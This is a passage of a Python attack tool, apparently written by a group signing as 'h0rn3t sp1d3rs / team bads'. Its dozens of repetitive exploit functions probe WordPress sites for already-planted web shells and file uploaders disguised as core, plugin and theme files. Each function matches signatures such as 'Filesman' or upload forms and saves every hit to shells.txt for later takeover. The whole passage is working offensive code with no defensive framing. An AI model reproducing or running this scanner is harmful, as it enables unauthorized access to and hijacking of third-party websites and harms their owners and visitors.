            check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print (' [#] Exploit 23 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
            else:
                print ('[#] Exploit 23 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_24(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 24 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 24 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
            else:
                print ('[#] Exploit 24 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_25(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,timeout=15)
        if ('<title>Upload files...</title>' in check.content.decode("utf-8")):
                print (' [#] Exploit 25 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/index.php?3x=3x\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<title>Upload files...</title>' in check.content.decode("utf-8"):
                    print (' [#] Exploit 25 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/index.php?3x=3x\n')
            else:
                print ('[#] Exploit 25 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_26(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
        if ('public_html' in check.content.decode("utf-8")):
                print (' [#] Exploit 26 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/1.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'public_html' in check.content.decode("utf-8"):
                    print (' [#] Exploit 26 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/1.php\n')
            else:
                print ('[#] Exploit 26 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_27(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 27 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/radio.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 27 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/radio.php\n')
            else:
                print ('[#] Exploit 27 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_28(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 28 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 28 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/404.php\n')
            else:
                print ('[#] Exploit 28 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_29(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,timeout=15)
        if ('ioptimization <input type="submit" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 29 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'ioptimization <input type="submit" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 29 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
            else:
                print ('[#] Exploit 29 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_30(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 30 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 30 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
            else:
                print ('[#] Exploit 30 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
#
#
#
#
#
#
def exploit_31(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/compat-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 31 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/compat-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/compat-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 31 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/compat-ajax-response.php\n')
            else:
                print ('[#] Exploit 31 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_32(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/feed-rss-meta.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 32 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/feed-rss-meta.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/feed-rss-meta.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 32 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rss-meta.php\n')
            else:
                print ('[#] Exploit 32 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_33(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/SimplePie/IRI-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 33 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/SimplePie/IRI-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/SimplePie/IRI-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 33 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/SimplePie/IRI-stream.php\n')
            else:
                print ('[#] Exploit 33 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_34(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-walker-page-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 34 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-walker-page-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-walker-page-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 34 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-walker-page-ajax-response.php\n')
            else:
                print ('[#] Exploit 34 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_35(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 35 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 35 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
            else:
                print ('[#] Exploit 35 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_36(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 36 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 36 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
            else:
                print ('[#] Exploit 36 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_37(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 37 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 37 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
            else:
                print ('[#] Exploit 37 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_38(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 38 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 38 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
            else:
                print ('[#] Exploit 38 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_39(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 39 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 39 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
            else:
                print ('[#] Exploit 39 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_40(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 40 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 40 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
            else:
                print ('[#] Exploit 40 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_41(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 41 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 41 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
            else:
                print ('[#] Exploit 41 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_42(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 42 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 42 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
            else:
                print ('[#] Exploit 42 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_43(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 43 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 43 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
            else:
                print ('[#] Exploit 43 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_44(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 44 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 44 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
            else:
                print ('[#] Exploit 44 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_45(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 45 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 45 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
            else:
                print ('[#] Exploit 45 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_46(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 46 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'//wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 46 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
            else:
                print ('[#] Exploit 46 z--> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#66 done
#call me h0rn3t sp1d3rs 
#team bads
#
#ok 
#
#key done
#h0rn3t sp1d3rs

def exploit_47(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 47 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 47 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
            else:
                print ('[#] Exploit 47 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_48(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 48 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 48 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
            else:
                print ('[#] Exploit 48 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_49(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 49 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 49 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
            else:
                print ('[#] Exploit 49 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_50(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 50 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 50 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
            else:
                print ('[#] Exploit 50 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_51(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 51 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 51 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
            else:
                print ('[#] Exploit 51 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_52(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-tax-query-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 52 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-tax-query-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-tax-query-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 52 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-tax-query-private.php\n')
            else:
                print ('[#] Exploit 52 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_53(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-customize-widgets-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
